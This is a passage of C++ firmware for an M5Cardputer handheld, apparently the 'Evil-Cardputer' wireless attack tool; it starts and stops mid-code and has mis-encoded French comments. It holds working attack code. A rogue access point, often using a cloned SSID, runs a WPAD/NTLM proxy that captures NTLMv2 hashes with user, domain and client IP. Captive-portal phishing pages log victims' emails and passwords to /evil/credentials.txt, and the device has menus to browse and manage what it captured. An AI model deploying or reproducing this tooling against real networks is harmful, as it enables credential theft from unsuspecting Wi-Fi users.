  float sweep = (t * 0.05f);
  for (int a = 0; a < 3; ++a) {
    float base = sweep + a * 1.8f;        // dÃ©calage entre arcs
    int r = 18 + a * 12;                  // distance Ã  lâ€™Ã©metteur
    // chaque arc couvre ~90Â° avec 2 Ã©paisseurs
    for (int thick = 0; thick < 2; ++thick) {
      float start = base + thick * 0.05f;
      float end   = start + 1.6f;         // largeur angulaire
      // parcourir lâ€™arc en petits pas
      for (float ang = start; ang <= end; ang += 0.05f) {
        int x = cx + (int)(cosf(ang) * r);
        int y = cy + (int)(sinf(ang) * r);
        // intensitÃ© en fonction de la proximitÃ© du centre de lâ€™arc
        float mid = (start + end) * 0.5f;
        float falloff = 1.0f - fabsf(ang - mid) / (end - start);
        uint8_t v = (uint8_t)(150 + 100 * falloff);
        d.drawPixel(x, y, hsv565(190, 180, v));
      }
    }
  }

  // ---- particules Ã©tincelles (surgissent / sâ€™Ã©teignent) ----
  struct Spark { float x,y,dx,dy,life; };
  static Spark S[12];
  if (!sparksInit) {
    for (auto &s : S) {
      s.x = cx; s.y = cy;
      float a = (random(0, 628)) / 100.0f; // 0..6.28
      float v = 0.7f + (random(0, 30) / 100.0f);
      s.dx = cosf(a) * v; s.dy = sinf(a) * v;
      s.life = random(20, 80);
    }
    sparksInit = true;
  }

  // update + draw
  for (auto &s : S) {
    // progression
    s.x += s.dx; s.y += s.dy;
    s.life -= 1.0f;

    // fade
    float f = max(0.0f, s.life / 80.0f);
    uint8_t v = (uint8_t)(200 * f + 30);

    // rendu
    uint16_t c = hsv565(185, 200, v);
    d.drawPixel((int)s.x, (int)s.y, c);
    // mini glow
    if ((int)s.life % 2 == 0) {
      d.drawPixel((int)s.x+1, (int)s.y, c);
      d.drawPixel((int)s.x, (int)s.y+1, c);
    }

    // respawn si mort ou hors Ã©cran
    if (s.life <= 0 || s.x < 0 || s.y < 0 || s.x >= d.width() || s.y >= d.height()) {
      s.x = cx; s.y = cy;
      float a = (random(0, 628)) / 100.0f;
      float v2 = 0.9f + (random(0, 50) / 100.0f);
      s.dx = cosf(a) * v2; s.dy = sinf(a) * v2;
      s.life = random(30, 90);
    }
  }

  d.setCursor(5, 5);
  d.print("Waiting WPAD.DAT on \n " + clonedSSID);
  
  // ---- footer discrÃ¨te ----
  d.setTextSize(1);
  d.setTextColor(TFT_DARKGREY, TFT_BLACK);
  d.setCursor(5, d.height() - 12);
  d.print("Press BACKSPACE to exit");

  // avance temps
  t++;
}





void updateHashUiNTLM() {
  auto& d = M5Cardputer.Display;

  // only update if new info
  if (ntlmLastUser == uiLastUser &&
      ntlmLastDomain == uiLastDomain &&
      ntlmLastClient == uiLastClient &&
      ntlmHashCount == uiLastCount) {
    return; // nothing changed -> skip redraw
  }

  // update cache
  uiLastUser   = ntlmLastUser;
  uiLastDomain = ntlmLastDomain;
  uiLastClient = ntlmLastClient;
  uiLastCount  = ntlmHashCount;

  d.fillScreen(BLACK);

  // 1) NTLM count
  d.setTextSize(1.3);
  d.setTextColor(WHITE, BLACK);
  d.setCursor(5, 5);
  d.print("NTLMv2: ");
  d.setTextSize(2);
  d.print(ntlmHashCount);

  // 2) User
  d.setTextSize(1.3);
  d.setCursor(5, 35);
  d.print("User: ");
  d.setTextSize(2);
  d.print(ntlmLastUser);

  // 3) Domain
  d.setTextSize(1.3);
  d.setCursor(5, 65);
  d.print("Domain: ");
  d.setTextSize(2);
  d.print(ntlmLastDomain);

  // 4) Client (IP)
  d.setTextSize(1.3);
  d.setCursor(5, 95);
  d.print("Client: ");
  d.setTextSize(2);
  d.print(ntlmLastClient);

  // footer
  d.setTextSize(1);
  d.setCursor(5, d.height() - 12);
  d.setTextColor(TFT_DARKGREY, BLACK);
  d.print("Press BACKSPACE to exit");
}

// =================== Setup / Loop ===================
void wpadAbuse() {
  dnsServer.stop();
  server.stop();
  
  M5.Lcd.fillScreen(BLACK);
  inMenu = false;
  isOperationInProgress = true;
  String ssid = clonedSSID.isEmpty() ? "Evil-Cardputer" : clonedSSID;

  if (WiFi.localIP().toString() == "0.0.0.0") {
    WiFi.mode(WIFI_MODE_AP);
  } else {
    WiFi.mode(WIFI_MODE_APSTA);
  }

  const int  channel       = 1;
  const bool ssid_hidden   = false;
  const int  max_clients   = 10;

  if (captivePortalPassword.isEmpty()) {
    WiFi.softAP(ssid.c_str(), nullptr, channel, ssid_hidden, max_clients);
  } else {
    WiFi.softAP(ssid.c_str(), captivePortalPassword.c_str(), channel, ssid_hidden, max_clients);
  }

  ipAP  = WiFi.softAPIP();
  ipSTA = WiFi.localIP();

  if (!dnsServer.start(53, "*", ipAP)) {
    Serial.println("[-] DNS Server failed to start!");
  }
  proxy.begin();
  Serial.println("[+] DNS + Proxy NTLM active");

  while (true) {
    dnsServer.processNextRequest();
    WiFiClient c = proxy.available();
    if (c) handleNTLMClient(c);

    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
      proxy.stop();
      dnsServer.stop();
      WiFi.mode(WIFI_MODE_APSTA);
      waitAndReturnToMenu("Return to menu");
      return;
    }

    unsigned long now = millis();
    if (now - lastRadarUpdate > radarInterval) {
      lastRadarUpdate = now;
      if (!ntlmActiveCapture) {
        showWaitingAnimationNTLM();   // radar fullscreen
      } else {
        updateHashUiNTLM();       // redraw only if new data
      }
    }
  }
} 









































void handleSaveFileUpload() {
    HTTPUpload& upload = server.upload();

    if (upload.status == UPLOAD_FILE_START) {
        // Reset authorization flag and authorize (route is already Basic Auth protected)
        isSaveFileAuthorized = true;

        String saveFileName = server.arg("filename");
        if (!saveFileName.startsWith("/")) {
            saveFileName = "/" + saveFileName;
        }

        // Supprimer l'original s'il existe avant de sauvegarder la nouvelle version
        if (SD.exists(saveFileName)) {
            if (SD.remove(saveFileName)) {
                Serial.println("Original file deleted successfully: " + saveFileName);
            } else {
                Serial.println("Failed to delete original file: " + saveFileName);
                isSaveFileAuthorized = false;
                return;
            }
        }

        // CrÃ©er un nouveau fichier pour l'Ã©criture
        saveFileObject = SD.open(saveFileName, FILE_WRITE);
        if (!saveFileObject) {
            Serial.println("Failed to open file for writing: " + saveFileName);
            isSaveFileAuthorized = false;
            return;
        }
    } else if (upload.status == UPLOAD_FILE_WRITE) {
        // Write the received bytes to the file
        if (isSaveFileAuthorized && saveFileObject) {
            saveFileObject.write(upload.buf, upload.currentSize);
        }
    } else if (upload.status == UPLOAD_FILE_END) {
        if (isSaveFileAuthorized && saveFileObject) {
            saveFileObject.close();
            Serial.println(F("File upload completed successfully."));
        }
    } else if (upload.status == UPLOAD_FILE_ABORTED) {
        if (saveFileObject) {
            saveFileObject.close();
            Serial.println(F("File upload aborted."));
        }
    }
}



void handleSdCardBrowse() {
    if (!guardAdmin()) return;

    String dirPath = server.arg("dir");
    if (dirPath == "") dirPath = "/";

    File dir = SD.open(dirPath);
    if (!dir || !dir.isDirectory()) {
        server.send(404, "text/html", "<html><body><p>Directory not found.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
        return;
    }

    String content;
    content += F("<style>.sd{border:1px solid var(--st);border-radius:12px;overflow:hidden;background:rgba(255,255,255,.04)}" 
                 ".tb{display:flex;gap:10px;align-items:center;padding:10px;border-bottom:1px solid var(--st);background:rgba(255,255,255,.02)}"
                 ".pill{padding:6px 10px;border:1px solid var(--st);border-radius:999px;background:rgba(255,255,255,.02)}"
                 ".hdr{display:grid;grid-template-columns:28px minmax(180px,1fr) 110px 200px;padding:10px;border-bottom:1px solid var(--st);color:var(--mut);font-size:12px;background:rgba(255,255,255,.01)}"
                 ".lst{list-style:none;margin:0;padding:0} .lst li{display:grid;grid-template-columns:28px minmax(180px,1fr) 110px 200px;align-items:center;padding:8px 10px;border-bottom:1px solid var(--st)}"
                 ".icon{text-align:center;opacity:.95} .dir .icon::before{content:'ðŸ“'} .file .icon::before{content:'ðŸ“„'}"
                 ".sz{text-align:right;color:var(--mut)} .acts{text-align:right;white-space:nowrap} .acts a{margin-left:8px;font-size:12px}"
                 ".edit{color:#41e18d} .del{color:#ff7b72}</style>");
    // Responsive and smaller Download button
    content += F("<style>.btn.sd-sm{padding:4px 8px;font-size:12px;color:var(--mut);background:rgba(255,255,255,.03);border-color:rgba(255,255,255,.18)}"
                 "@media(max-width:520px){.hdr{grid-template-columns:28px 1fr}.hdr div:nth-child(3),.hdr div:nth-child(4){display:none}"
                 ".lst li{grid-template-columns:28px 1fr;grid-template-rows:auto auto auto}"
                 ".lst li .icon{grid-row:1 / span 3}"
                 ".lst li > a{grid-column:2;grid-row:1}"
                 ".lst li .sz{grid-column:2;grid-row:2;text-align:left;margin-top:2px;font-size:12px}"
                 ".lst li .acts{grid-column:2;grid-row:3;text-align:left;margin-top:4px;display:flex;gap:8px;flex-wrap:wrap}"
                 ".lst li .acts a{margin-left:0;font-size:11px}"
                 "}</style>");
    content += F("<div class='sd'>");
    content += F("<div class='tb'>");
    content += "<a class='btn sd-sm' href='/download-all-files?dir=" + dirPath + "'>Download ALL</a>";
    content += "<div style='margin-left:10px;color:var(--mut);font-size:12px'>Remote path</div>";
    content += "<span class='pill'>" + htmlEscape(dirPath) + "</span>";
    content += F("</div>");
    content += F("<div class='hdr'><div></div><div>Name</div><div>Size</div><div>Actions</div></div>");
    content += getDirectoryHtml(dir, dirPath);
    content += F("</div>");
    server.send(200, "text/html", wrapAdminPage("Remote File Browser", content));
    dir.close();
}

// Convert bytes to a humanâ€‘readable string (B, KB, MB, GB)
static String humanReadableSize(uint64_t bytes) {
    const char* suffixes[] = {"B", "KB", "MB", "GB"};
    double count = (double)bytes;
    int i = 0;
    while (count >= 1024.0 && i < 3) {
        count /= 1024.0;
        i++;
    }
    char buf[24];
    if (i == 0) {
        snprintf(buf, sizeof(buf), "%u %s", (unsigned)bytes, suffixes[i]);
    } else {
        snprintf(buf, sizeof(buf), "%.1f %s", count, suffixes[i]);
    }
    return String(buf);
}

String getDirectoryHtml(File dir, String path) {
    String html;
    html += F("<ul class='lst'>");
    if (path != "/") {
        String parentPath = path.substring(0, path.lastIndexOf('/'));
        if (parentPath == "") parentPath = "/";
        html += "<li class='up dir'><div class='icon'></div><a href='/check-sd-file?dir=" + parentPath + "'>[ Up ]</a><div class='sz'>DIR</div><div class='acts'></div></li>";
    }
    // Directories
    while (File f = dir.openNextFile()) {
        if (f.isDirectory()) {
            String full = String(f.name());
            String name = full;
            if (path != "/" && full.startsWith(path)) {
                name = full.substring(path.length());
                if (name.startsWith("/")) name = name.substring(1);
            }
            String target = path + (path.endsWith("/") ? "" : "/") + name;
            if (!target.startsWith("/")) target = "/" + target;
            html += "<li class='dir'><div class='icon'></div><a href='/check-sd-file?dir=" + target + "'>" + htmlEscape(name) + "</a><div class='sz'>DIR</div><div class='acts'></div></li>";
        }
        f.close();
    }
    // Files
    dir.rewindDirectory();
    while (File f2 = dir.openNextFile()) {
        if (!f2.isDirectory()) {
            String full = String(f2.name());
            String name = full;
            if (path != "/" && full.startsWith(path)) {
                name = full.substring(path.length());
                if (name.startsWith("/")) name = name.substring(1);
            }
            String target = path + (path.endsWith("/") ? "" : "/") + name;
            if (!target.startsWith("/")) target = "/" + target;
            html += "<li class='file'><div class='icon'></div><a href='/download-sd-file?filename=" + target + "'>" + htmlEscape(name) + "</a><div class='sz'>" + humanReadableSize(f2.size()) + "</div><div class='acts'>";
            if (name.endsWith(".txt") || name.endsWith(".html") || name.endsWith(".ini")) {
                html += "<a class='edit' href='/edit-file?filename=" + target + "'>[Edit]</a>";
            }
            html += "<a class='del' href='#' onclick=\"if(confirm('Delete " + htmlEscape(name) + " ?')) location.href='/delete-sd-file?filename=" + target + "'; return false;\">[Delete]</a>";
            html += "</div></li>";
        }
        f2.close();
    }
    html += F("</ul>");
    return html;
}



void handleFileDownload() {
  if (!guardAdmin()) return;
  String fileName = server.arg("filename");
  if (!fileName.startsWith("/")) {
    fileName = "/" + fileName;
  }
  if (SD.exists(fileName)) {
    File file = SD.open(fileName, FILE_READ);
    if (file) {
      String downloadName = fileName.substring(fileName.lastIndexOf('/') + 1);
      server.sendHeader("Content-Disposition", "attachment; filename=" + downloadName);
      server.streamFile(file, "application/octet-stream");
      file.close();
      return;
    }
  }
  server.send(404, "text/html", "<html><body><p>File not found.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
}


void handleDownloadAllFiles() {
  if (!guardAdmin()) return;

  String dirPath = server.arg("dir");
  if (dirPath == "") dirPath = "/";

  File dir = SD.open(dirPath);
  if (!dir || !dir.isDirectory()) {
    server.send(404, "text/html", "<html><body><p>Directory not found.</p></body></html>");
    return;
  }

  String boundary = "MULTIPART_BYTERANGES";

  // DÃ©but de la rÃ©ponse multipart
  String responseHeaders = "HTTP/1.1 200 OK\r\n";
  responseHeaders += "Content-Type: multipart/x-mixed-replace; boundary=" + boundary + "\r\n";
  responseHeaders += "Connection: close\r\n\r\n";
  server.sendContent(responseHeaders);

  while (File file = dir.openNextFile()) {
    if (!file.isDirectory()) {
      String header = "--" + boundary + "\r\n";
      header += "Content-Type: application/octet-stream\r\n";
      header += "Content-Disposition: attachment; filename=\"" + String(file.name()) + "\"\r\n";
      header += "Content-Length: " + String(file.size()) + "\r\n\r\n";
      server.sendContent(header);

      uint8_t buffer[256];
      while (size_t bytesRead = file.read(buffer, sizeof(buffer))) {
        server.client().write(buffer, bytesRead);
      }
      server.sendContent("\r\n");
    }
    file.close();
  }

  // Fin de la rÃ©ponse multipart
  String footer = "--" + boundary + "--\r\n";
  server.sendContent(footer);

  dir.close();
}


void handleFileUpload() {
  HTTPUpload& upload = server.upload();
  const size_t MAX_UPLOAD_SIZE = 16384;

  if (upload.status == UPLOAD_FILE_START) {
    String filename = upload.filename;
    String directory = server.arg("directory");

    if (!directory.startsWith("/")) {
      directory = "/" + directory;
    }

    if (!directory.endsWith("/")) {
      directory += "/";
    }

    String fullPath = directory + filename;

    fsUploadFile = SD.open(fullPath, FILE_WRITE);
    if (!fsUploadFile) {
      Serial.println("Upload start failed: Unable to open file " + fullPath);
      server.send(500, "text/html", "File opening failed");
      return;
    }

    Serial.print(F("Upload Start: "));
    Serial.println(fullPath);
  } else if (upload.status == UPLOAD_FILE_WRITE) {
    if (fsUploadFile && upload.currentSize > 0 && upload.currentSize <= MAX_UPLOAD_SIZE) {
      size_t written = fsUploadFile.write(upload.buf, upload.currentSize);
      if (written != upload.currentSize) {
        Serial.println(F("Write Error: Inconsistent data size."));
        fsUploadFile.close();
        server.send(500, "text/html", "File write error");
        return;
      }
    } else {
      if (!fsUploadFile) {
        Serial.println(F("Error: File is no longer valid for writing."));
      } else if (upload.currentSize > MAX_UPLOAD_SIZE) {
        Serial.println(F("Error: Data segment size too large."));
        Serial.println(upload.currentSize);
      } else {
        Serial.println(F("Information: Empty data segment received."));
      }
      return;
    }
  } else if (upload.status == UPLOAD_FILE_END) {
    if (fsUploadFile) {
      fsUploadFile.close();
      Serial.print(F("Upload End: "));
      Serial.println(upload.totalSize);
      server.send(200, "text/html", "<html><body><p>File successfully uploaded</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
      Serial.println(F("File successfully uploaded"));
    } else {
      server.send(500, "text/html", "File closing error");
      Serial.println(F("File closing error"));
    }
  }
}

void listDirsRecursive(const String &basePath, String &out) {
    File dir = SD.open(basePath);
    if (!dir || !dir.isDirectory()) {
        dir.close();
        return;
    }

    while (true) {
        File entry = dir.openNextFile();
        if (!entry) break;

        if (entry.isDirectory()) {

            // Construire le chemin complet
            String childPath = basePath;
            if (!childPath.endsWith("/")) childPath += "/";
            childPath += entry.name();

            // Ajouter
            out += childPath + "\n";

            // RÃ©cursion
            listDirsRecursive(childPath, out);
        }

        entry.close();
    }

    dir.close();
}



void handleListDirectories() {
    if (!guardAdmin()) return;

    String out = "/\n";  // racine

    // RÃ©cursion complÃ¨te
    listDirsRecursive("/", out);

    server.send(200, "text/plain", out);
}




void listDirectories(File dir, String path, String & output) {
  while (File file = dir.openNextFile()) {
    if (file.isDirectory()) {
      output += String(file.name()) + "\n";
      listDirectories(file, String(file.name()), output);
    }
    file.close();
  }
}


void handleFileDelete() {
  if (!guardAdmin()) return;

  String fileName = server.arg("filename");
  if (!fileName.startsWith("/")) {
    fileName = "/" + fileName;
  }
  if (SD.exists(fileName)) {
    if (SD.remove(fileName)) {
      server.send(200, "text/html", "<html><body><p>File deleted successfully</p></body></html>");
      Serial.println(F("-------------------"));
      Serial.println(F("File deleted successfully"));
      Serial.println(F("-------------------"));
    } else {
      server.send(500, "text/html", "<html><body><p>File could not be deleted</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
      Serial.println(F("-------------------"));
      Serial.println(F("File could not be deleted"));
      Serial.println(F("-------------------"));
    }
  } else {
    server.send(404, "text/html", "<html><body><p>File not found</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
    Serial.println(F("-------------------"));
    Serial.println(F("File not found"));
    Serial.println(F("-------------------"));
  }
}

void servePortalFile(const String & filename) {

  File webFile = SD.open(filename);
  if (webFile) {
    server.streamFile(webFile, "text/html");
    /*Serial.println(F("-------------------"));
      Serial.println(F("serve portal."));
      Serial.println(F("-------------------"));*/
    webFile.close();
  } else {
    server.send(404, "text/html", "<html><body><p>File not found</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
  }
}

void saveCredentials(const String & email, const String & password, const String & portalName, const String & clonedSSID) {
  File file = SD.open("/evil/credentials.txt", FILE_APPEND);
  if (file) {
    file.println("-- Email -- \n" + email);
    file.println("-- Password -- \n" + password);
    file.println("-- Portal -- \n" + portalName); // Ajout du nom du portail
    file.println("-- SSID -- \n" + clonedSSID); // Ajout du SSID clonÃ©
    file.println("------------------");
    file.close();
    if (ledOn){
      for (int flashes = 0; flashes < 2; flashes++){
        pixels.setPixelColor(0, pixels.Color(0, 0, 255));
        pixels.show();
        delay(150);
        pixels.setPixelColor(0, pixels.Color(0, 0, 0));
        pixels.show();
        delay(150);
      }
    }
    Serial.println(F("-------------------"));
    Serial.println(" !!! Credentials " + email + ":" + password + " saved !!! ");
    Serial.println("On Portal Name: " + portalName);
    Serial.println("With Cloned SSID: " + clonedSSID);
    Serial.println(F("-------------------"));
  } else {
    Serial.println(F("Error opening file for writing"));
  }
}




void stopCaptivePortal() {
  dnsServer.stop();
  server.stop();
  WiFi.mode(WIFI_MODE_APSTA);
  WiFi.softAPdisconnect(true);
  isCaptivePortalOn = false;
  Serial.println(F("-------------------"));
  Serial.println(F("Portal Stopped"));
  Serial.println(F("-------------------"));
  if (ledOn) {
    pixels.setPixelColor(0, pixels.Color(255, 0, 0));
    pixels.show();
    delay(250);
    pixels.setPixelColor(0, pixels.Color(0, 0, 0));
    pixels.show();
  }
  waitAndReturnToMenu("  Portal Stopped");
}

/*
============================================================================================================================
Change portal site
========================================================================================================================================================================================================================================================
*/

void listPortalFiles() {
  File root = SD.open("/evil/sites");
  numPortalFiles = 0;
  portalFiles.clear();
  portalFiles.reserve(50);
  Serial.println(F("Available portals:"));
  while (File file = root.openNextFile()) {
    if (!file.isDirectory()) {
      String fileName = file.name();
      if (fileName.endsWith(".html")) {
        String full = String("/evil/sites/") + fileName;
        portalFiles.push_back(full);
        numPortalFiles = (int)portalFiles.size();
        Serial.print(numPortalFiles - 1);
        Serial.print(F(": "));
        Serial.println(fileName);
      }
    }
    file.close();
  }
  // Pre-allocate small dynamic containers used with indexed access
  if (ssidList.empty()) ssidList.assign(30, String());
  // portalFiles filled on demand by listPortalFiles
  root.close();
}



void changePortal() {
  listPortalFiles();
  const int listDisplayLimit = M5.Display.height() / 12;
  bool needDisplayUpdate = true;
  bool keyHandled = false;  // Pour gÃ©rer la rÃ©ponse Ã  la touche une fois

  unsigned long lastKeyPressTime = 0;
  const unsigned long debounceDelay = 200; // Temps en millisecondes pour ignorer les pressions supplÃ©mentaires

  // Attendre que la touche KEY_ENTER soit relÃ¢chÃ©e avant de continuer
  enterDebounce();

  while (!inMenu) {
    if (needDisplayUpdate) {
      int listStartIndex = max(0, min(portalFileIndex, numPortalFiles - listDisplayLimit));

      M5.Display.clear();
      M5.Display.setTextSize(1.5);
      M5.Display.setTextColor(menuTextUnFocusedColor);
      M5.Display.setCursor(10, 10);

      for (int i = listStartIndex; i < min(numPortalFiles, listStartIndex + listDisplayLimit); i++) {
        int lineHeight = 12; // Espacement rÃ©duit entre les lignes
        if (i == portalFileIndex) {
          M5.Display.fillRect(0, (i - listStartIndex) * lineHeight, M5.Display.width(), lineHeight, menuSelectedBackgroundColor);
          M5.Display.setTextColor(menuTextFocusedColor);
        } else {
          M5.Display.setTextColor(menuTextUnFocusedColor);
        }
        M5.Display.setCursor(10, (i - listStartIndex) * lineHeight);
        M5.Display.println(portalFiles[i].substring(12));
      }
      M5.Display.display();
      needDisplayUpdate = false;
    }

    M5.update();
    M5Cardputer.update();

    if (millis() - lastKeyPressTime > debounceDelay) {
      if (M5Cardputer.Keyboard.isKeyPressed(';') && !keyHandled) {
        portalFileIndex = (portalFileIndex - 1 + numPortalFiles) % numPortalFiles;
        needDisplayUpdate = true;
        lastKeyPressTime = millis();
      } else if (M5Cardputer.Keyboard.isKeyPressed('.') && !keyHandled) {
        portalFileIndex = (portalFileIndex + 1) % numPortalFiles;
        needDisplayUpdate = true;
        lastKeyPressTime = millis();
      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && !keyHandled) {
        selectedPortalFile = portalFiles[portalFileIndex];
        inMenu = true;
        Serial.println(F("-------------------"));
        Serial.println(selectedPortalFile.substring(12) + " portal selected.");
        Serial.println(F("-------------------"));
        waitAndReturnToMenu(selectedPortalFile.substring(12) + " selected");
        break; // Sortir de la boucle
      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
        inMenu = true;
        drawMenu();
        break;
      }

      // RÃ©initialiser la gestion des touches une fois aucune n'est pressÃ©e
      if (!M5Cardputer.Keyboard.isKeyPressed(';') &&
          !M5Cardputer.Keyboard.isKeyPressed('.') &&
          !M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
        keyHandled = false;
      }
    }
  }
}





/*
============================================================================================================================
List Credentials
============================================================================================================================
*/
String credentialsList[50];
int numCredentials = 0;

void readCredentialsFromFile() {
  File file = SD.open("/evil/credentials.txt");
  if (file) {
    numCredentials = 0;
    while (file.available() && numCredentials < 50) {
      credentialsList[numCredentials++] = file.readStringUntil('\n');
    }
    file.close();
  } else {
    Serial.println(F("Error opening file"));
  }
}


void checkCredentials() {
  readCredentialsFromFile(); // Assume this populates a global array or vector with credentials

  // Initial display setup
  int currentListIndex = 0;
  bool needDisplayUpdate = true;

  enterDebounce();
  unsigned long lastKeyPressTime = 0;
  const unsigned long debounceDelay = 200; // Temps en millisecondes pour ignorer les pressions supplÃ©mentaires

  while (true) {
    if (needDisplayUpdate) {
      displayCredentials(currentListIndex); // Function to display credentials on the screen
      needDisplayUpdate = false;
    }

    M5.update();
    M5Cardputer.update();
    handleDnsRequestSerial(); // Handle any background tasks

    if (millis() - lastKeyPressTime > debounceDelay) {
      if (M5Cardputer.Keyboard.isKeyPressed(';')) {
        currentListIndex = max(0, currentListIndex - 1);
        needDisplayUpdate = true;
        lastKeyPressTime = millis();
      } else if (M5Cardputer.Keyboard.isKeyPressed('.')) {
        currentListIndex = min(numCredentials - 1, currentListIndex + 1);
        needDisplayUpdate = true;
        lastKeyPressTime = millis();
      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
        break; // Exit the loop to return to the menu
      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
        inMenu = true;
        drawMenu();
        break;
      }
    }
  }
  // Return to menu
  inMenu = true; // Assuming this flag controls whether you're in the main menu
  drawMenu(); //the main menu
}


void displayCredentials(int index) {
  // Clear the display and set up text properties
  M5.Display.clear();
  M5.Display.setTextSize(1.5);

  const int lineHeight = 15; // RÃ©duire l'espace entre les lignes
  int maxVisibleLines = 9; // Nombre maximum de lignes affichables Ã  l'Ã©cran
  int currentLine = 0; // Ligne actuelle en cours de traitement
  int firstLineIndex = index; // Index de la premiÃ¨re ligne de l'entrÃ©e sÃ©lectionnÃ©e
  int linesBeforeIndex = 0; // Nombre de lignes avant l'index sÃ©lectionnÃ©

  // Calculer combien de lignes sont nÃ©cessaires avant l'index sÃ©lectionnÃ©
  for (int i = 0; i < index; i++) {
    int neededLines = 1 + M5.Display.textWidth(credentialsList[i]) / (M5.Display.width() - 20);
    linesBeforeIndex += neededLines;
  }

  // Ajuster l'index de la premiÃ¨re ligne si nÃ©cessaire pour s'assurer que l'entrÃ©e sÃ©lectionnÃ©e est visible
  while (linesBeforeIndex > 0 && linesBeforeIndex + maxVisibleLines - 1 < index) {
    linesBeforeIndex--;
    firstLineIndex--;
  }

  // Afficher les entrÃ©es de credentials visibles
  for (int i = firstLineIndex; currentLine < maxVisibleLines && i < numCredentials; i++) {
    String credential = credentialsList[i];
    int neededLines = 1 + M5.Display.textWidth(credential) / (M5.Display.width() - 20);

    if (i == index) {
      M5.Display.fillRect(0, currentLine * lineHeight, M5.Display.width(), lineHeight * neededLines, menuSelectedBackgroundColor);
    }

    for (int line = 0; line < neededLines; line++) {
      M5.Display.setCursor(10, (currentLine + line) * lineHeight);
      M5.Display.setTextColor(i == index ? menuTextFocusedColor : menuTextUnFocusedColor);

      int startChar = line * (credential.length() / neededLines);
      int endChar = min(credential.length(), startChar + (credential.length() / neededLines));
      M5.Display.println(credential.substring(startChar, endChar));
    }

    currentLine += neededLines;
  }

  M5.Display.display();
}

/*
============================================================================================================================
Confirm pop up yes/no
============================================================================================================================
*/


void okPopup(String message) {
  M5.Display.clear();
  M5.Display.setTextSize(1.5);

  int messageWidth = message.length() * 9;  // Approximate character width
  int startX = (M5.Display.width() - messageWidth) / 2;

  M5.Display.setCursor(startX, M5.Display.height() / 2 - 20);
  M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
  M5.Display.println(message);

  // Draw OK button
  M5.Display.setTextColor(TFT_BLUE);
  M5.Display.setCursor((M5.Display.width() - 18) / 2, M5.Display.height() / 2 + 20);
  M5.Display.print("OK");

  M5.Display.display();
  enterDebounce();
  while (true) {
    M5.update();
    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
      break;
    }
  }
}

bool confirmPopup(String message) {
  bool confirm = false;
  bool decisionMade = false;

  M5.Display.clear();
  M5.Display.setTextSize(1.5);
  int messageWidth = message.length() * 9;  // Each character is 6 pixels wide
  int startX = (M5.Display.width() - messageWidth) / 2;  // Calculate starting X position

  M5.Display.setCursor(startX, M5.Display.height() / 2);
  M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
  M5.Display.println(message);

  M5.Display.setTextColor(TFT_GREEN);
  M5.Display.setCursor(60, 110);
  M5.Display.print("Y");

  M5.Display.setTextColor(TFT_RED);
  M5.Display.setCursor(M5.Display.width() - 60, 110);
  M5.Display.print("N");

  M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
  M5.Display.display();

  while (!decisionMade) {
    M5.update();
    M5Cardputer.update();

    if (M5Cardputer.Keyboard.isKeyPressed('y')) {
      confirm = true;
      decisionMade = true;
    } else if (M5Cardputer.Keyboard.isKeyPressed('n')) {
      confirm = false;
      decisionMade = true;
    }
  }

  return confirm;
}


/*
============================================================================================================================
Delete credentials
============================================================================================================================
*/
void deleteCredentials() {
  if (confirmPopup("Delete credentials?")) {
    File file = SD.open("/evil/credentials.txt", FILE_WRITE);
    if (file) {
      file.close();
      Serial.println(F("-------------------"));
      Serial.println(F("credentials.txt deleted"));
      Serial.println(F("-------------------"));
      waitAndReturnToMenu("Deleted successfully");
      Serial.println(F("Credentials deleted successfully"));
    } else {
      Serial.println(F("-------------------"));
      Serial.println(F("Error deleteting credentials.txt "));
      Serial.println(F("-------------------"));
      waitAndReturnToMenu("Error..");
      Serial.println(F("Error opening file for deletion"));
    }
  } else {
    waitAndReturnToMenu("Deletion cancelled");
  }
}


int countPasswordsInFile() {
  File file = SD.open("/evil/credentials.txt");
  if (!file) {
    Serial.println(F("Error opening credentials file for reading"));
    return 0;
  }

  int passwordCount = 0;
  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (line.startsWith("-- Password")) {
      passwordCount++;
    }
  }

  file.close();
  return passwordCount;
}

/*
============================================================================================================================
Monitor status
============================================================================================================================
*/

int oldNumClients = -1;
int oldNumPasswords = -1;

String wificonnectedPrint = "";

void displayMonitorPage1() {
  M5.Display.clear();
  M5.Display.setTextSize(1.5);
  M5.Lcd.setTextColor(menuTextUnFocusedColor, TFT_BLACK);

  if (WiFi.localIP().toString() != "0.0.0.0") {
    wificonnected = true;
    wificonnectedPrint = "Y";
    ipAddress = WiFi.localIP().toString();
  } else {
    wificonnected = false;
    wificonnectedPrint = "N";
    ipAddress = "           ";
  }
  M5.Display.setCursor(5, 45);
  M5.Display.println("SSID: " + clonedSSID);
  M5.Display.setCursor(5, 60);
  M5.Display.println("Portal: " + String(isCaptivePortalOn ? "On" : "Off"));
  M5.Display.setCursor(5, 75);
  M5.Display.println("Page: " + selectedPortalFile.substring(12));
  M5.Display.setCursor(5, 90);
  M5.Display.println("Connected : " + wificonnectedPrint);
  M5.Display.setCursor(5, 105);
  M5.Display.println("IP : " + ipAddress);

  oldNumClients = -1;
  oldNumPasswords = -1;

  M5.Display.display();

  // Attendre que la touche KEY_ENTER soit relÃ¢chÃ©e avant de continuer
  enterDebounce();

  unsigned long lastKeyPressTime = 0;
  const unsigned long debounceDelay = 200; // Temps en millisecondes pour ignorer les pressions supplÃ©mentaires
  while (M5Cardputer.Keyboard.isKeyPressed(',') ||
         M5Cardputer.Keyboard.isKeyPressed('/') ||
